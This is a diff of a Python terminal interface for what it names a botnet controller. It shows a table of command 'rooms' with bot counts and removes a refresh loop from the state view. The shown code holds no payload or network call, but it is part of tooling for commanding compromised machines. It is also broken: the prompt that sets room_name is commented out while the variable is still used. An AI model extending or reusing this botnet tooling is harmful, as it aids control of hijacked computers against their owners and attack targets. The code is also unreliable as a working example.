@@ -75,39 +75,36 @@ class BotnetGUI:
         Prompt.ask("[bold white]Press Enter to return to the main menu...")
 
     def show_state(self):
-        while True:
-            try:
-                self.console.clear()
-                self.console.print(Align.center(Panel("[bold green]Botnet State[/]", expand=True)))
-                
-                table = Table()
-                table.add_column("Room Name", style="bold cyan")
-                table.add_column("Bot Count", justify="center", style="bold magenta")
-                
-                total_bots = 0
-                room_list = list(self.controller.command_rooms.items())
-                for _, room in room_list:
-                    bot_count = len(room.bots)
-                    total_bots += bot_count
-                    table.add_row(room.room.name[4:], str(bot_count))
-                
-                self.console.print(Align.center(table))
-                self.console.print(f"[bold cyan]Total Bots: {total_bots}[/]")
+        try:
+            self.console.clear()
+            self.console.print(Align.center(Panel("[bold green]Botnet State[/]", expand=True)))
+            
+            table = Table()
+            table.add_column("Room Name", style="bold cyan")
+            table.add_column("Bot Count", justify="center", style="bold magenta")
+            
+            total_bots = 0
+            room_list = list(self.controller.command_rooms.items())
+            for _, room in room_list:
+                bot_count = len(room.bots)
+                total_bots += bot_count
+                table.add_row(room.room.name[4:], str(bot_count))
+            
+            self.console.print(Align.center(table))
+            self.console.print(f"[bold cyan]Total Bots: {total_bots}[/]")
 
-                room_names = [room.room.name[4:] for _, room in room_list]
-                # room_name = Prompt.ask("[bold white]Enter the room name to view bots (or press Enter to return)", choices=room_names + [""])
-                
-                if room_name != "":
-                    room_name =  "cmd_" + room_name
-                    selected_room = [room for _, room in room_list if room.room.name == room_name][0]
-                    self.show_bot_status_in_room(selected_room)
-                else:
-                    return
+            room_names = [room.room.name[4:] for _, room in room_list]
+            # room_name = Prompt.ask("[bold white]Enter the room name to view bots (or press Enter to return)", choices=room_names + [""])
+            
+            if room_name != "":
+                room_name =  "cmd_" + room_name
+                selected_room = [room for _, room in room_list if room.room.name == room_name][0]
+                self.show_bot_status_in_room(selected_room)
+            else:
+                return
 
-            except Exception as e:
-                self.console.print(f"[bold red]Error:[/] {str(e)}")
-            finally:
-                time.sleep(1/60)
+        except Exception as e:
+            self.console.print(f"[bold red]Error:[/] {str(e)}")
     
     def create_room(self):
         try:
